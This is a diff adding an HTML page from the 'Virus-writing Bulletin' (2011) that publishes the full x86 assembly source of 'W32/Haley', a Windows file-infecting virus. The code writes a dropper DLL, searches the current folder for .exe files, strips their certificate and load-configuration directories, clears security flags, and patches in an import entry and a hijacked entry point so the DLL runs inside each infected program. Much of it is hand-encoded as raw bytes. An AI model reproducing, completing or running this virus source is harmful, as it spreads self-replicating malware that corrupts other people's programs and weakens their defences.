@@ -1,0 +1,574 @@
+<html>
+<head><title>;)</title><link rel="stylesheet" href="style.css" /></head>
+<body>
+<center><h3>Virus-writing Bulletin</h3><h5>Presents!</h5><h4>W32/Haley</h4>-<br><font size=0>. &#9679; glósóli &#9679; .</font></center><br>
+<div id="menu">
+[ <li><a href="1.html">Articles</a></li> ]
+[ <li><a href="2.html">Sources</a></li> ]
+[ <li><a href="3.html">Editorial</a></li> ]
+</div>
+<div id="wrapper">
+<div style="float:left;margin-top:50px;margin-left:1px;">
+<pre>
+.486
+.model  flat, stdcall
+
+IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE =  40h
+CERTIFICATE_TABLE_DATA_DIRECTORY       =  98h
+LOAD_CONFIG_TABLE_DATA_DIRECTORY       =  30h
+IMAGE_DIRECTORY_ENTRY_EXPORT           =  78h
+IMPORT_TABLE_DATA_DIRECTORY            =  80h
+
+F0      =  FILE_SHARE_READ or FILE_SHARE_WRITE  
+G0      =  GENERIC_READ or GENERIC_WRITE
+DLLSIZE =  offset _end - offset dos_hdr
+CALL_OP =  0e8h
+
+.data?
+STACK_REG struct
+ LO32_EDI dd  ?
+ LO32_ESI dd  ?
+ LO32_EBP dd  ?
+ LO32_ESP dd  ?
+ LO32_EBX dd  ?
+ LO32_EDX dd  ?
+ LO32_ECX dd  ?
+ LO32_EAX dd  ?
+STACK_REG ends
+
+.code
+assume fs:nothing
+
+haley_dll       proc 
+        dec     dword ptr [esp + 8]          ;do not execute if DLL_PROCESS_DETACH
+        js      DETACH
+        pushad
+        db      33h
+        db      0dbh
+        call    create_dll
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        popad
+
+DETACH:
+        ret     0ch
+
+echo 28/12/10 - haley by hh86                ;it's everything that is connected and beautiful
+                                             ;and now I know just where I stand
+haley_dll       endp
+
+importtbl       IMAGE_IMPORT_DESCRIPTOR <sizeof IMAGE_IMPORT_DESCRIPTOR * 2, 0, 0, sizeof IMAGE_IMPORT_DESCRIPTOR + sizeof IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk, sizeof IMAGE_IMPORT_DESCRIPTOR * 2 + 9>
+                dd  0
+dllfile         db  "v", ".dll", 0, 0, 0
+                dq  0
+                dd  80000001h
+                dd  0
+
+call_dllmain    proc
+        mov     eax, 80000001h
+        call    eax
+call_dllmain    endp
+
+call_hostmain   proc
+        push    30h
+        pop     esi
+        lods    dword ptr fs:[eax]
+        mov     eax, dword ptr [eax + 8]
+        jmp     dword ptr [eax + offset dos_hdr]
+call_hostmain   endp
+
+;-------------------------------------------------------------------------------
+;image for a PE32 DLL file 
+;-------------------------------------------------------------------------------
+
+dos_hdr         label    near
+        db      "MZ"                          ;e_magic
+        dw      "CV"                          ;e_cblp
+        db      "!", 0                        ;e_cp
+        dw      0                             ;e_crlc
+        dw      0                             ;e_cparhdr
+        dw      0                             ;e_minalloc
+        db      "PE", 0, 0                    ;signature
+        dw      IMAGE_FILE_MACHINE_I386       ;machine
+        dw      1                             ;numberofsections
+        dd      0                             ;timedatestamp
+        dd      0                             ;pointertosymboltable
+        dd      0                             ;numberofsymbols
+        dw      68h                           ;sizeofoptionalheader
+        dw      IMAGE_FILE_RELOCS_STRIPPED or IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
+        dw      IMAGE_NT_OPTIONAL_HDR32_MAGIC ;magic
+        db      0                             ;majorlinkerversion
+        db      0                             ;minorlinkerversion
+        dd      0                             ;sizeofcode
+        dd      0                             ;sizeofinitializeddata
+        dd      0                             ;sizeofuninitializeddata
+        dd      0                             ;addressofentrypoint
+        dd      0                             ;baseofcode
+        dd      0ch                           ;baseofdata and e_lfanew
+        dd      0                             ;imagebase
+        dd      1                             ;sectionalignment
+        dd      1                             ;filealignment
+        dw      0                             ;majoroperatingsystemversion
+        dw      0                             ;minoroperatingsystemversion
+        dw      0                             ;majorimageversion
+        dw      0                             ;minorimageversion
+        dw      4                             ;majorsubsystemversion
+        dw      0                             ;minorsubsystemversion
+        dd      0                             ;win32versionvalue
+        dd      offset _end - offset dos_hdr  ;sizeofimage
+        dd      offset _sect - offset dos_hdr ;sizeofheaders
+        dd      0                             ;checksum
+        dw      IMAGE_SUBSYSTEM_WINDOWS_CUI   ;subsystem
+        dw      IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
+        dd      0                             ;sizeofstackreserve
+        dd      1000h                         ;sizeofstackcommit
+        dd      100000h                       ;sizeofheapreserve
+        dd      0                             ;sizeofheapcommit
+        dd      0                             ;loaderflags
+        dd      2                             ;numberofrvaandsizes
+        dd      offset _sect - offset dos_hdr ;export
+        dd      0                             ;export
+        db      8 dup (0)                     ;name
+        dd      offset _end - offset _sect    ;virtualsize
+        dd      offset _sect - offset dos_hdr ;virtualaddress
+        dd      offset _end - offset _sect    ;sizeofrawdata
+        dd      offset _sect - offset dos_hdr ;pointertorawdata
+        dd      0                             ;pointertorelocations
+        dd      0                             ;pointertolinenumbers
+        dw      0                             ;numberofrelocations
+        dw      0                             ;numberoflinenumbers
+        dd      0                             ;characteristics
+
+_sect           label    near
+exporttbl       IMAGE_EXPORT_DIRECTORY <0, offset require - offset dos_hdr, 0, 0, 0, 1, -1, 0, (offset exporttbl + 4) - offset dos_hdr, 0, 0>
+
+require         proc
+        db      60h
+        db      6ah
+        db      30h                          ;process environment block
+        db      5eh
+        db      33h
+        db      0d2h
+        db      0e8h                         ;skip SE handler
+        dd      0bh
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        db      61h
+        ret
+        db      64h
+        db      0ffh
+        db      32h
+        db      64h
+        db      89h
+        db      22h
+        db      64h
+        db      0adh
+        db      8bh
+        db      40h
+        db      0ch
+        db      8bh
+        db      70h
+        db      14h
+        db      0adh
+        db      8bh
+        db      0
+        db      8bh
+        db      68h
+        db      10h
+        call    skip_crc 
+        dd      03fc1bd8dh
+        dd      0da68238fh
+
+;-------------------------------------------------------------------------------
+;DLL name
+;-------------------------------------------------------------------------------
+
+        db      30h, 0
+
+skip_crc:
+        db      5eh
+ 
+;-------------------------------------------------------------------------------
+;walk lists
+;-------------------------------------------------------------------------------
+
+crc32   macro
+        db      32h
+        db      7
+        db      6ah
+        db      8
+        db      59h
+        db      0d1h
+        db      0e8h
+        db      73h
+        db      5
+        db      35h
+        dd      0edb88320h
+        db      0e2h
+        db      0f5h
+        db      47h
+        db      38h
+        db      0fh
+        db      75h
+        db      0ebh
+endm
+
+import_next:
+        db      8bh
+        db      45h
+        db      IMAGE_DOS_HEADER.e_lfanew
+        db      8bh
+        db      5ch
+        db      28h
+        db      IMAGE_DIRECTORY_ENTRY_EXPORT
+        db      3
+        db      0ddh
+
+export_next:
+        db      8bh
+        db      7bh
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfNames
+        db      3
+        db      0fdh
+        db      8bh
+        db      3ch
+        db      97h
+        db      0f9h
+        db      1bh
+        db      0c0h
+        db      3
+        db      0fdh
+        crc32
+        db      0f7h
+        db      0d0h
+        db      39h
+        db      6
+        je      l_res
+        db      42h
+        db      39h
+        db      53h
+        db      IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames
+        jne     export_next
+        int     3
+
+;-------------------------------------------------------------------------------
+;resolve API address
+;-------------------------------------------------------------------------------
+
+l_res:
+        db      8bh
+        db      7bh
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
+        db      3
+        db      0fdh
+        db      0fh
+        db      0b7h
+        db      3ch
+        db      57h
+        db      8bh
+        db      43h
+        db      IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
+        db      3
+        db      0c5h
+        db      8bh
+        db      4
+        db      0b8h
+        db      3
+        db      0c5h
+        db      50h
+        db      0adh
+        db      33h
+        db      0d2h
+        db      80h
+        db      3eh
+        db      30h
+        jne     import_next
+        db      8bh
+        db      0dch
+        db      56h
+        db      0ffh, 53h, 4                 ;call LoadLibraryA
+        db      50h
+        db      0ffh, 13h                    ;call FreeLibrary
+        int     3
+require         endp
+_end            label    near
+
+;-------------------------------------------------------------------------------
+;create DLL file
+;-------------------------------------------------------------------------------
+
+create_dll      proc
+        db      64h
+        db      0ffh
+        db      33h
+        db      64h, 89h, 23h                ;SEH protected
+        push    ebx
+        push    ebx
+        push    CREATE_NEW
+        push    ebx
+        push    F0
+        push    G0
+        push    offset dllfile
+        call    CreateFile 
+        inc     eax
+        jz      find_fs      
+        dec     eax
+        push    eax
+        xchg    ebp, eax
+        push    ebx
+        push    esp
+        push    DLLSIZE
+        push    offset dos_hdr
+        push    ebp
+        call    WriteFile 
+        call    CloseHandle
+        jmp     find_fs
+create_dll      endp
+
+find_fs         proc
+        enter   (sizeof WIN32_FIND_DATA + sizeof LOADED_IMAGE) + (sizeof IMAGE_DOS_HEADER.e_lfanew + 1), 0
+        mov     edi, esp
+        lea     esi, dword ptr [edi + LOADED_IMAGE]
+        push    esi
+
+;-------------------------------------------------------------------------------
+;find exe files in current directory
+;-------------------------------------------------------------------------------
+
+        db      0e8h
+        dd      6
+        db      "*"
+        db      "."
+        db      "e"
+        db      "x"
+        db      "e"
+        db      0
+        call    FindFirstFile
+        db      95h
+        jmp     call_mf
+
+find_next:
+        db      56h
+        db      55h
+        call    FindNextFile 
+        test    eax, eax
+        jz      call_seh
+
+call_mf:
+        pushad
+        db      CALL_OP, low offset map_file - offset delta_seh, 0, 0, 0
+
+delta_seh:
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        popad
+        jmp     find_next
+find_fs         endp
+
+;-------------------------------------------------------------------------------
+;create map
+;-------------------------------------------------------------------------------
+
+map_file        proc
+        db      64h
+        db      0ffh
+        db      33h
+        db      64h, 89h, 23h                ;SEH protected
+        db      8dh
+        db      4eh
+        db      WIN32_FIND_DATA.cFileName
+        db      57h
+        db      53h
+        db      53h
+        db      57h
+        db      53h
+        db      51h
+        call    MapAndLoad
+        db      48h
+        js      call_seh                     ;no unmap happens if zero
+        db      CALL_OP, low offset infect_exe - offset delta_os, 0, 0, 0
+
+delta_os:
+        db      58h
+        db      58h
+        db      5ch
+        db      33h, 0c0h
+        db      64h
+        db      8fh
+        db      0
+        db      58h
+        call    UnMapAndLoad 
+map_file        endp
+
+call_seh        label    near
+        int     3
+        
+        ;so darkness I became
+
+infect_exe      proc
+        db      64h
+        db      0ffh
+        db      33h
+        db      64h, 89h, 23h
+
+;-------------------------------------------------------------------------------
+;32-bit machine
+;GUI or CUI
+;-------------------------------------------------------------------------------
+
+        db      8bh
+        db      6fh
+        db      LOADED_IMAGE.MappedAddress
+        db      8bh
+        db      47h
+        db      LOADED_IMAGE.FileHeader
+        db      0f6h
+        db      40h
+        db      IMAGE_NT_HEADERS.FileHeader.Characteristics + 1
+        db      high IMAGE_FILE_32BIT_MACHINE
+        jz      call_seh
+        db      8ah
+        db      48h
+        db      IMAGE_NT_HEADERS.OptionalHeader.Subsystem
+        db      49h
+        db      49h
+        db      80h
+        db      0f9h
+        db      IMAGE_SUBSYSTEM_WINDOWS_CUI - IMAGE_SUBSYSTEM_WINDOWS_GUI
+        jnbe    call_seh
+        db      80h
+        db      60h
+        db      IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics + 1
+        db      0f0h                         ;NO_SEH and NX_COMPATIBLE flags
+
+;-------------------------------------------------------------------------------
+;PE size must be equal to file size
+;certificate table must be at end of last section
+;-------------------------------------------------------------------------------
+
+        db      8bh
+        db      57h
+        db      LOADED_IMAGE.Sections
+        db      8bh                          ;DWORD not WORD ;)
+        db      4fh
+        db      LOADED_IMAGE.NumberOfSections
+        db      6bh
+        db      0c9h
+        db      sizeof IMAGE_SECTION_HEADER
+        db      8dh
+        db      74h
+        db      11h
+        db      -(sizeof IMAGE_SECTION_HEADER - IMAGE_SECTION_HEADER.SizeOfRawData)
+        db      6ah
+        db      10h
+        db      5fh
+        db      8dh
+        db      4ch
+        db      0f8h
+        db      CERTIFICATE_TABLE_DATA_DIRECTORY - IMPORT_TABLE_DATA_DIRECTORY
+        db      8bh
+        db      56h
+        db      sizeof IMAGE_SECTION_HEADER.PointerToRawData
+        db      3
+        db      16h
+                                             ;do not infect if imports
+        cmp     dword ptr [eax + edi * 8], ebx
+        jne     call_seh
+        db      0b7h
+        db      10h
+        db      39h
+        db      19h
+        jb      call_seh
+        db      39h
+        db      11h
+        jne     call_seh
+
+;-------------------------------------------------------------------------------
+;set to zero the certificate table data directory
+;disable SafeSEH
+;-------------------------------------------------------------------------------
+
+        fldz
+        fstp    qword ptr [ecx]
+        fldz
+        fstp    qword ptr [ecx + LOAD_CONFIG_TABLE_DATA_DIRECTORY]
+
+;-------------------------------------------------------------------------------
+;increase image and section size
+;-------------------------------------------------------------------------------
+
+        db      1
+        db      5eh
+        db      -(IMAGE_SECTION_HEADER.SizeOfRawData - IMAGE_SECTION_HEADER.Misc.VirtualSize)
+        db      1
+        db      58h
+        db      IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
+        db      8bh
+        db      4eh
+        db      -(IMAGE_SECTION_HEADER.SizeOfRawData - IMAGE_SECTION_HEADER.VirtualAddress)
+        db      3
+        db      0eh
+        db      1                            ;increase raw size
+        db      1eh
+        db      81h
+        db      4eh
+        db      IMAGE_SECTION_HEADER.Characteristics - IMAGE_SECTION_HEADER.SizeOfRawData
+                                             ;Windows can write-enable section while binding imports
+        dd      IMAGE_SCN_MEM_EXECUTE
+        db      60h
+        db      8dh
+        db      3ch
+        db      2ah
+        db      0beh
+        dd      offset importtbl
+        db      60h
+        db      6ah, offset dos_hdr - offset importtbl
+        db      59h
+        db      0f3h, 0a4h
+        db      61h
+        db      1
+        db      0fh
+        db      1
+        db      04fh, IMAGE_IMPORT_DESCRIPTOR.Name1
+        db      1
+        db      04fh, IMAGE_IMPORT_DESCRIPTOR.FirstThunk
+        db      81h
+        db      0c1h
+        dd      offset call_dllmain - offset importtbl
+        db      87h
+        db      48h
+        db      IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
+        db      89h
+        db      8fh
+        dd      (offset call_hostmain - offset importtbl) + 0ah
+        db      61h
+        db      89h                          ;now add import table entry to data directory
+        db      00ch
+        db      0f8h
+        int     3
+infect_exe      endp
+end     haley_dll
+</pre>
+</div>
+</div>
+<div id="endofpage"><div style="width:900px;margin:0pt auto;padding-top:5px;padding-bottom:5px">Virus-writing Bulletin 2011</div>
+</body>
+</html>
